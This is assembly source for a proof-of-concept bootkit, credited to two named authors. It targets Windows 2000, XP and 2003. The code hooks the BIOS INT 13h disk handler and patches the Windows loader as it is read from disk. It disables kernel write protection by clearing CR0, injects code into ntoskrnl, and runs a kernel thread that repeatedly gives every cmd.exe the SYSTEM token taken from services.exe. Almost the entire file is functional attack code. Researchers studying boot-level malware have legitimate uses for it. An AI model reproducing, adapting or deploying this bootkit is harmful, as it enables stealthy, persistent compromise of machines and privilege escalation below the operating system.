;Authors: Nitin Kumar & Vipin Kumar
;NOTE:- We are not respomsible for anything.Use at your own risk
;If you develop anything using this code, please remember to give necessary credit to the authors

	cli
        xor bx,bx
        mov ss,bx
  	mov [ss:0x7bfe],sp
      	mov sp,0x7bfe               
        push ds
        pushad
        mov ds,bx
     	mov ax,[0x413]
      	sub ax,2
      	mov [0x413],ax
      	shl ax,0x6
      	mov ax,CODEBASEIN1MB
        mov es,ax
        mov [0x7c00 + codereloc],ax
       
        mov [0x7c00 +  codeloc2],ax
        cld
      	mov si,0x7c00
        xor di,di
      	mov cx,0x400        ;number of bytes 2 copy to new location this is in words currently 2 kbs are loaded
        rep movsw
        sti
      	mov ax,0x201
        mov cl,0x2
        cdq
        
        cli
    	mov eax,[0x4c]
  	mov [es:INT13INTERRUPTVALUE],eax
	mov word [0x4c], newint13handler
    	mov [0x4e],es
        sti
 directjumpwithouthook:
        push es
      	push word newmemorycodestart
        retf
newmemorycodestart:
        mov es,dx
        mov ax,0x201
        dec cx
        mov dl,0x80
        mov bh,0x7c
        int 0x13
        
        popad
        pop ds
        pop sp
  	    jmp 0x0:0x7c00    ;jmp to original mbr from hard drive
 
 newint13handler: 	    

        pushf
  	
        cmp ah,0x42
        jz processint13request
        cmp ah,0x2
        jz processint13request
        popf
        jmp 0x0:0x0 ;jmp back to original handler;thse zero are filled above
    INT13INTERRUPTVALUE EQU $-4
processint13request:
        mov [cs:STOREAH],ah
        popf
        pushf
  call far [cs:INT13INTERRUPTVALUE] ;this jumps back to original int13 ivt
        jc returnback ;since request failed just go back
        pushf
        cli
        push es
        pusha
        mov ah,0x0       ;   this zero gets fillled by original ah code passed
  STOREAH EQU $-1      
      	cmp ah,0x42
        jnz notextrequest
        lodsw
        lodsw
        les bx,[si]
      
notextrequest:
        test al,al
        jng scandone
        cld
        mov cl,al
        mov al,0x8b
        shl cx,0x9
        mov di,bx
 scanloop:
        repne scasb
        jnz scandone
        cmp dword [es:di],0x74f685f0
        jnz scanloop
        cmp word [es:di+0x4],0x8021
        jnz scanloop
        mov word [es:di-0x1],0x15ff
       	mov eax,cs
       	shl eax,0x4
        or [cs:updatecodeloc],eax
        add ax,CODE32START
        mov [cs: dword_E5],eax
        sub ax,0x4
        mov [es:di+0x1],eax
        
  
       
 
 scandone:            ;pop pushed registers and get out
          popa
          pop es
          popf
returnback:  
      retf 0x2

     
; to adjust code
db 90h
db 90h
   dword_E5:     dd 0
    
    
    

        
        
        



USE32




		; 32 bit code starts here
CODE32START:   
 	            
                
        	pushfd
        	pushAd
; 
  		mov     word [ds:0B8000h], 0x024E ; 
                mov     word [ds:0B8002h], 0x0269
                mov     word [ds:0B8004h], 0x0274
                mov     word [ds:0B8006h], 0x0269
                mov     word [ds:0B8008h], 0x026E
                
                 
                mov     word [ds:0B800Ch], 0x024B ; 
                mov     word [ds:0B800Eh], 0x0275
                mov     word [ds:0B8010h], 0x026D
                mov     word [ds:0B8012h], 0x0261
                mov     word [ds:0B8014h], 0x0272
                
                 
                mov     word [ds:0B8018h], 0x0226   ;; for &
                 
                 
                mov     word [ds:0B801Ch], 0x0256 ; 
                mov     word [ds:0B801Eh], 0x0269
                mov     word [ds:0B8020h], 0x0270
                mov     word [ds:0B8022h], 0x0269
                mov     word [ds:0B8024h], 0x026E
                 
                 
                mov     word [ds:0B8028h], 0x024B ; 
                mov     word [ds:0B802Ah], 0x0275
                mov     word [ds:0B802Ch], 0x026D
                mov     word [ds:0B802Eh], 0x0261
                mov     word [ds:0B8030h], 0x0272
                 
                 
                                      
  		mov eax,0           
  		mov ax,0
  		codeloc2 EQU $-2
  		shl eax,4
  		mov [eax + codereloc+ 4],eax
  
              
              
                 cld
                 mov     edi, [esp+24h]
                 and     edi, 0FFF00000h
                 mov     al, 0C7h ; '¦'

loc_F:                            

                scasb
                jnz     short loc_F
                cmp     dword [edi], 40003446h
                jnz     short loc_F
                mov     al, 0A1h ; 

loc_1C:                           
               scasb
               jnz     short loc_1C
               mov     esi, [edi]
               mov     esi, [esi] ;points to base of loader table
               
               mov     esi,[esi]  ;points to first entry it's Ntoskrnl.exe
               mov     edx,[esi]  ;points to second entry ,it's hal.dll
               
               
               add     esi,24    ; to obtain pointer to ntoskrnls, base address,it 24 bytes from it's entry
               mov     eax,[esi]
               mov [CODEBASEIN1MBEXACT + NTOSkrnlbase ],eax ; store result in code
               mov ebx,eax                       ;  store result in ebx register
               
               
             
              ; push edx;so as to later use it   
              ; pop edx          ;recall edx
        ;       add edx,24    ;edx contains pointer to hal loader entry , then it will point to base address of hal.dll
       ;        mov edx,[edx] ; now edx contains base address of HAL
        ;        mov [CODEBASEIN1MBEXACT + HALbase ],edx ; store result in code
               
             
               
               
         mov     word [ds:0B80A2h], 0231h     ;  Display 1 so we now we found the NT base addresss
                 

	pushfd
	pushad
	mov ebp,[CODEBASEIN1MBEXACT + NTOSkrnlbase]
	mov ebx,0x26f7bf31                   ;hash for ZwSetSystemInformation
	;mov ebx,0x7ede29ea                    ;hash for RtlZeroMemory
	call FindExportedFunctionbyHash
	mov dword [CODEBASEIN1MBEXACT + RtlZeroMemorylocation],eax
	popad
	popfd
        mov     word [ds:0B80A4h], 0232h     ;  Display 2 so we now we found the function we overwrite temporarily
                
                
                
                
                
                
                
                
        call findpend
        mov     word [ds:0B80A6h], 0233h   ;  Display 3 so we now we found the textual data in NTOSkrnl to overwrite
               
               
              
      	
 ;location we tempraily overwrite              
               
        add eax,0x55      ; NTOSKRNL BASE + 0x55
        mov dword [CODEBASEIN1MBEXACT+basetempbackdoor], eax
               

            
           
             
      
        
          mov     ecx, cr0
          mov edx, ecx
          and     ecx, 0FFFEFFFFh ;    Here above and below we are
                                        ; disabling protection in CR0 registers
          mov     cr0, ecx 
          
             
             
     
            
            
             
                 
            
         
          ;  ebx points to  base of ntos krnl
         
  	     add ebx,0x55
            ;/copy original function code in ntoskrnl 
             mov edi,ebx 
             mov esi,[CODEBASEIN1MBEXACT + RtlZeroMemorylocation]
             mov ecx,backdoorend - backdoorstart ;
             rep movsb
           
            
            ;/stores our code in ntoskrnl 
             mov edi,  [CODEBASEIN1MBEXACT + NTOScodelocation2]     ;  initial value found by hand  0x804dc000 + 0x19b780  hardcoded;
                                                                   ;now it's finded dynamically
             mov esi,CODEBASEIN1MBEXACT
             mov ecx,codeends  ;;copy all code
             rep movsb
        
            
            
            ;/below 4 lines overwrite function in windows xp kernel with backdoor code
             mov edi,[CODEBASEIN1MBEXACT + RtlZeroMemorylocation]
             mov esi,CODEBASEIN1MBEXACT + backdoorstart
             mov ecx,backdoorend - backdoorstart
             rep movsb
        
        
        
        
         
         
        
             mov     word [ds:0B80A8h], 0234h       ;  Display 4 so we now we patched up successfully
                
             mov cr0,edx
                 
                 
              
                 
	popad
	popfd

	mov		esi, eax
	test		eax, eax
	jnz		short @PatchFunction_done_nojz

	pushfd
	add		dword [esp+4], 21h
	popfd
@PatchFunction_done_nojz:

	ret
                





updatecodeloc :
dd 0



  




;signature  5f 50 45 4e  for _PEN      ; after this location a number of kbs are free

findpend:
 ;below function searches memory for 5f 50 45 4e  for _PEN,this location is used to store code in NTOSkrnl;
  pushfd
  pushad
  mov edi, eax      ;       ;copy kernel base  to scan 
    
  searchagain:
              cmp dword [edi], 0x45505f53 ;         
              jne contpend
               
              
              ;hard code values used for testing,now these are found at runtime
      	   ;  mov edi,0x804dc000 + 0x199c20  ;;;;;;;;;;;;;;;0x80675604; 0x804dc000 + 0x199c20
      	   ;   mov edi,0x80400000+0x16aee0     ;for Win 2k SP0
               mov  [CODEBASEIN1MBEXACT + NTOScodelocation2],edi 
      
             jmp overpend         
      contpend:
                inc edi  
             inc eax 
             jmp searchagain
      overpend:
      popad
      popfd
      ret





db  'rootboot'


;this is the actual backdoor or kernel mode shell code and will be called only once
kernelmodeshellcode:
mov dword [CODEBASEKERNEL + Stack],esp


call SetOSVars

;jmp newthreadstartshere 
push dword 0
push CODEBASEKERNEL + newthreadstartshere     ; threadstartlocation
push dword 0
push dword 0
push dword 0
push dword 0    ; for THREAD_ALL_ACCESS
push CODEBASEKERNEL + Threadhandle

mov ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov ebx,0x5814a503
call FindExportedFunctionbyHash
call eax
mov dword esp,[CODEBASEKERNEL + Stack] ;correct the stack  ;correct stack and return
ret ;





;below code corrects and recovers the original function then calls our backdoor code only once
fullbackdoorcode:

 mov     ecx, cr0
 mov edx,ecx
 and     ecx, 0FFFEFFFFh ; Here above and below we are
                                        ; disabling protection in CR0 registers
 mov     cr0, ecx 
 mov edi,[CODEBASEKERNEL + RtlZeroMemorylocation]
 mov esi,0x804dc
 basetempbackdoor EQU $-4
 mov ecx,backdoorend - backdoorstart
 rep movsb
mov cr0,edx


  
 
 
              
call kernelmodeshellcode       ;call our shellcode
popad
popfd
push dword [CODEBASEKERNEL + RtlZeroMemorylocation]
ret


;this code temprarily replaces Zero fucntions as it gets called later when kernel gets initaliz\sed
;below code is used to replace rtlzeromemory function
backdoorstart EQU $
backdoor:
	     pushf
             pusha
             
             
             ;copy our code to ffdf0800
            mov edi,CODEBASEKERNEL
            mov esi,   0 ;;;  here location of copy of our code is placed in NTOSKRNL
 NTOScodelocation2 EQU $-4           
             mov ecx,codeends
             rep movsb    
                
	     push CODEBASEKERNEL+fullbackdoorcode
             ret
             
       
   
backdoorend EQU $   



; this function expects ebx contains 4 byte hash and ebp contains base address of target executable image
; this function also expects that you push a pointer where the function pointer will be store after the functions finds it



FindExportedFunctionbyHash:
        	
		xor ecx,ecx                   ;ecx stores function number
		
		mov edi,[ebp+0x3c] ; to get offset to pe header
		mov edi,[ebp+edi+0x78] ; to get offset to export table

		add edi,ebp
nextexporttableentry:
		mov edx,[edi+0x20]
		add edx,ebp
		mov esi,[edx+ecx*4]
		add esi,ebp
		xor eax,eax
		cdq

		
nextbyte:
		lodsb
		ror edx,0xd
		add edx,eax
		test al,al
		jnz nextbyte
		inc ecx       
		
		cmp edx,ebx
        	jnz  nextexporttableentry
		dec ecx             ; hash number found
	
		mov ebx,[edi+0x24]
 		add ebx,ebp
 		mov cx,[ebx+ecx*2]
		mov ebx,[edi+0x1c]
		add ebx,ebp
		mov eax,[ebx+ecx*4]
		add eax,ebp    ;//function address arrives in eax now
		ret   ;just return
	

;this functions hump to the function

CallExportedFunctionbyHash:
        	
		xor ecx,ecx                   ;ecx stores function number
		
		mov edi,[ebp+0x3c] ; to get offset to pe header
		mov edi,[ebp+edi+0x78] ; to get offset to export table

		add edi,ebp
callnextexporttableentry:
		mov edx,[edi+0x20]
		add edx,ebp
		mov esi,[edx+ecx*4]
		add esi,ebp
		xor eax,eax
		cdq

		
callnextbyte:
		lodsb
		ror edx,0xd
		add edx,eax
		test al,al
		jnz callnextbyte
		inc ecx       
		
		cmp edx,ebx
        	jnz  callnextexporttableentry
		dec ecx             ; hash number found
	
		mov ebx,[edi+0x24]
 		add ebx,ebp
 		mov cx,[ebx+ecx*2]
		mov ebx,[edi+0x1c]
		add ebx,ebp
		mov eax,[ebx+ecx*4]
		add eax,ebp    ;//function address arrives in eax now
		jmp eax   ;just call the function after finding it
		

;after function ends here

;this is the new thread which keeps on executing  nad runnin the shellcode
newthreadstartshere:

mov dword [CODEBASEKERNEL + Stack2],esp     ; save stack to protect it 

newthreadstartsafe :


;delays kernel
xor eax,eax
delayagain:
push eax
push dword CODEBASEKERNEL + Delaytime ;push pointer to delay time
push dword 0 ;; since wait is not alertable
push dword 0 ; since wait is kernel mode
mov dword ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov dword ebx,0x6c92c2c3         ;hash for KeDelayExecution
call CallExportedFunctionbyHash
pop eax
inc eax
cmp eax,6  ;wait around a half min
jne delayagain



mov ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov ebx,0xdaf46e78     ;Call IoGetCurrentProcess
call CallExportedFunctionbyHash         ;returns system eprocess in eax


mov dword [CODEBASEKERNEL + _EPROCESS],eax
mov eax,[CODEBASEKERNEL + _EPROCESS]  ; noe _EPROCESS for kernel or System is in eax
xor ecx,ecx
mov word cx, [CODEBASEKERNEL + Activelinkoffset]
add dword eax, ecx ; get address of EPROCESS+ActiveProcessLinks
@eproc_loop:
mov eax, [eax] ; get next EPROCESS struct
mov word cx, [CODEBASEKERNEL + Imagenameoffset]
cmp dword [eax+ecx], "SERV"            ; is it SERVICES.EXE? xp and 2k3 knows upper case
je outof
cmp dword [eax+ecx], "serv"            ; is it SERVICES.EXE? win2k knows lower case
je outof
jnz @eproc_loop

outof:

; now  we store services.exe security token, so as we use it later on
mov word cx, [CODEBASEKERNEL + SecurityTokenoffset]
mov ebx,[eax + ecx ] ;    to obtain token from offset of activeprocesslinks token
mov dword [CODEBASEKERNEL + token],ebx ;token has been stored


;now we start again from beginning to find all cmd.exe and then try to escalate them to SYSTEM priv

mov eax,[CODEBASEKERNEL + _EPROCESS]  ; noe _EPROCESS for kernel or System is in eax
mov word cx, [CODEBASEKERNEL + Activelinkoffset]
add eax, ecx ; get address of EPROCESS+ActiveProcessLinks



xor edx,edx
mov edx,[eax]       ;we will compare this value later on so we find out whether the list has been traversed fully 
mov eax, [eax]      ;so as to skip first process and check it when whole list has traversed

@cmd_search_loop:
mov eax, [eax] ; get next EPROCESS struct it get to next activeprocess link _EPROCESS + 0x88 for xp sp 0
;mov ecx, 0xEC ;;EP_ModuleName    module name offset in _EPROCESS     offset in memory is EC for WinXP SP0
xor ecx,ecx
mov word cx, [CODEBASEKERNEL + Imagenameoffset]
cmp dword [eax+ecx], "CMD."            ; is it CMD.EXE? winxp knows upper case
je patchit
cmp dword [eax+ecx], "cmd."            ; is it cmd.exe?  win2k knows lower case
je patchit
jne donotpatchtoken          ;jmp takes 5 bytes but this takes 2 bytes
patchit:
mov word cx, [CODEBASEKERNEL + SecurityTokenoffset]
mov dword [eax + ecx],ebx   ;;;200-0x88],ebx      ;replace it with services.exe token offset foe sec token is 200

donotpatchtoken:

cmp edx,eax  ; have we traversed fully
jne @cmd_search_loop




push dword CODEBASEKERNEL + dbgmsg
mov dword ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov dword ebx,0x1b4347e9           ;hash for DbgPrint
call CallExportedFunctionbyHash

mov dword esp,[CODEBASEKERNEL + Stack2] ;correct the stack  ;correct stack and return 

jmp newthreadstartsafe              ;loop again




SetOSVars:
push dword 0
push dword 0
push dword CODEBASEKERNEL + OSMinorVersion
push dword 0
mov dword ebp,[CODEBASEKERNEL + NTOSkrnlbase]
mov dword ebx,0x0bf483cc          ;hash for PsGetVersion
call CallExportedFunctionbyHash
                 
cmp DWORD [CODEBASEKERNEL + OSMinorVersion],0        ;if its 0,then it's win2k 
jne  winxp
mov WORD [CODEBASEKERNEL + Activelinkoffset],0xA0 
mov WORD [CODEBASEKERNEL + Imagenameoffset],0x15c          ;          original at 1fc
mov WORD [CODEBASEKERNEL + SecurityTokenoffset],0x8c       ;         original at 12c
ret
winxp:

;first copy vars same for xp and 2k3
mov WORD [CODEBASEKERNEL + Activelinkoffset],0x88 ;this is absolute
mov WORD [CODEBASEKERNEL + SecurityTokenoffset],0x40       ;this is relative to avtivelinkoffset

cmp DWORD [CODEBASEKERNEL + OSMinorVersion],1         ;if its 1,then it's winXP
jne  win2k3
mov WORD [CODEBASEKERNEL + Imagenameoffset],0xEC              ;this is relative to avtivelinkoffset
ret

win2k3: ;it must be win2k3
mov WORD [CODEBASEKERNEL + Imagenameoffset],0xCC              ;this is relative to avtivelinkoffset
ret


RtlZeroMemorylocation:
dd  0


;db 'Ver'
OSMinorVersion:
dd 0

;db 'NTOSBASE'
NTOSkrnlbase:
dd 0;



;db 'CODERELOC'
codereloc:
dd 0
dd 0


;db 'Stack'
Stack:
dd 0


;db 'Stack'  ; stack for newly created thread
Stack2:
dd 0


;db 'Delaytime'   ;it value is -5 *10 * 1000 * 1000 for waiting 5 secs
Delaytime:
dd 0xFD050F80 ;
dd 0xffffffff


;db 'Hthread'
Threadhandle:
dd 0;

dbgmsg:
db "\nNitin Kumar & Vipin Kumar POC Code for Boot kit\n",0

token:
dd 'token'
dd 0

_EPROCESS:
dd 0

;All OS Specific vars

Activelinkoffset:
dw 0

Imagenameoffset:
dw 0;

SecurityTokenoffset:
dw 0;



;donot declare anything below this

codeends EQU $ 




CODEBASEKERNEL EQU 0xffdf0900
CODEBASEIN1MB EQU 0x9e00 ;;;;      ;9d00 for compat with pxe boot
CODEBASEIN1MBEXACT EQU 0x9e000     ;;this is the exact
 